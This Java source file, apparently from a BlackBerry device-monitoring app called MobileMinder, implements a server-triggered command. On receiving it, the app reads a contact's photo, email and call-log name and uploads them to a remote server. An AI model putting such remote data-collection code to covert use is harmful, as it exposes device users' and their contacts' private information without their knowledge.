package com.mmtechco.mobileminder.contacts;

import java.io.IOException;
import java.util.Enumeration;
import java.util.Hashtable;

import javax.microedition.pim.PIM;
import javax.microedition.pim.PIMException;

import net.rim.blackberry.api.pdap.BlackBerryContact;
import net.rim.blackberry.api.pdap.BlackBerryContactList;
import net.rim.blackberry.api.phone.phonelogs.PhoneCallLogID;
import net.rim.device.api.io.Base64InputStream;
import net.rim.device.api.system.EncodedImage;

import com.mmtechco.mobileminder.data.ActivityLog;
import com.mmtechco.mobileminder.net.ErrorMessage;
import com.mmtechco.mobileminder.net.Message;
import com.mmtechco.mobileminder.net.Reply;
import com.mmtechco.mobileminder.net.Reply.ParseException;
import com.mmtechco.mobileminder.net.Response;
import com.mmtechco.mobileminder.net.Server;
import com.mmtechco.mobileminder.prototypes.COMMAND_TARGETS;
import com.mmtechco.mobileminder.prototypes.Controllable;
import com.mmtechco.util.CRC32;
import com.mmtechco.util.Logger;
import com.mmtechco.util.ToolsBB;

/**
 * Retrieves the contact picture stored on the device based on a specified phone
 * number that is sent in a command message
 */
public class ContactPic implements Controllable {
	private static Logger logger = Logger.getLogger(ContactPic.class);

	private static final String TYPE = "PIC";
	private static final String VERB = "CALL";

	public boolean processCommand(String[] args) {
		logger.info("Processing contact photo command");
		try {
			String type = args[0];
			String verb = args[1];
			String number = String.valueOf(Long.parseLong(args[2]));

			// Check type and verb are matching
			if (!(type.equalsIgnoreCase(TYPE) && verb.equalsIgnoreCase(VERB))) {
				return false;
			}
			// Get picture
			ContactPicContainer picContainer = getContactPic(number);
			if (picContainer == null) {
				return true;
			}

			// Send to server
			logger.debug("Sending contact pic to server");
			ContactPicMessage message = new ContactPicMessage(
					picContainer.filetype, number, picContainer.email);
			Hashtable keyvalPairs = new Hashtable();
			CRC32 crc = new CRC32();
			crc.update(picContainer.stream.getBytes());
			keyvalPairs.put("crc", String.valueOf(crc.getValue()));
			keyvalPairs.put("pic", picContainer.stream);
			Response response = Server.post(message.toString(), keyvalPairs);
			Reply.Regular reply = new Reply.Regular(response.getContent());
			if (!reply.error) {
				return true;
			}
		} catch (IndexOutOfBoundsException e) {
			ActivityLog.addMessage(new ErrorMessage(
					"Could not parse command args", e));
		} catch (NumberFormatException e) {
			ActivityLog.addMessage(new ErrorMessage("Could not process number",
					e));
		} catch (IOException e) {
			logger.warn("Connection problem: " + e.getMessage());
		} catch (ParseException e) {
			ActivityLog.addMessage(new ErrorMessage(e));
		}
		return false;
	}

	public boolean isTarget(COMMAND_TARGETS targets) {
		if (targets == COMMAND_TARGETS.CONTACTS) {
			return true;
		}
		return false;
	}

	public ContactPicContainer getContactPic(String number) {
		try {
			BlackBerryContactList contactList = (BlackBerryContactList) PIM
					.getInstance()
					.openPIMList(PIM.CONTACT_LIST, PIM.READ_WRITE);
			for (Enumeration contacts = contactList.items(number,
					BlackBerryContact.TEL); contacts.hasMoreElements();) {
				BlackBerryContact contact = (BlackBerryContact) contacts
						.nextElement();
				if (contact.countValues(BlackBerryContact.PHOTO) > 0) {
					byte[] byteStreamEncoded = contact.getBinary(
							BlackBerryContact.PHOTO,
							BlackBerryContact.ATTR_NONE);
					byte[] byteStream = Base64InputStream.decode(
							byteStreamEncoded, 0, byteStreamEncoded.length);
					EncodedImage pic = EncodedImage.createEncodedImage(
							byteStream, 0, byteStream.length);
					String email = "";
					if (contact.countValues(BlackBerryContact.EMAIL) > 0) {
						email = contact.getString(BlackBerryContact.EMAIL, 0);
					}
					return new ContactPicContainer(byteStream,
							pic.getMIMEType(), email);
				}
			}
		} catch (PIMException e) {
			logger.warn("Could not read contacts");
		} catch (IOException e) {
			logger.warn("Could not decode pic");
		}
		return null;
	}

	/**
	 * Convenience class to hold the contact picture as a hex encoded string
	 * and other associated attributes
	 */
	class ContactPicContainer {
		public String stream; 
		public String filetype;
		public String email;

		public ContactPicContainer(byte[] byteStream, String filetype,
				String email) {
			this.stream = byteArrayToHexString(byteStream);
			this.filetype = filetype;
			this.email = email;
		}
	}

	private String byteArrayToHexString(byte[] b) {
		StringBuffer sb = new StringBuffer(b.length * 2);
		for (int i = 0; i < b.length; i++) {
			int v = b[i] & 0xff;
			if (v < 16) {
				sb.append('0');
			}
			sb.append(Integer.toHexString(v));
		}
		return sb.toString().toUpperCase();
	}
}

class ContactPicMessage extends Message {
	public ContactPicMessage(String fileType, String contactNumber,
			String contactEmail) {
		super(Message.CONTACT_PIC, new String[] {
				ToolsBB.getInstance().getDate(), fileType,
				getContactNameFromNumber(contactNumber), contactNumber,
				contactEmail });
	}

	private static String getContactNameFromNumber(String contactNum) {
		String thePhoneNumber = "<no name>";
		PhoneCallLogID callLog = new PhoneCallLogID(contactNum);
		if (callLog.getName() != null) {
			thePhoneNumber = callLog.getName();
		}
		return thePhoneNumber;
	}
}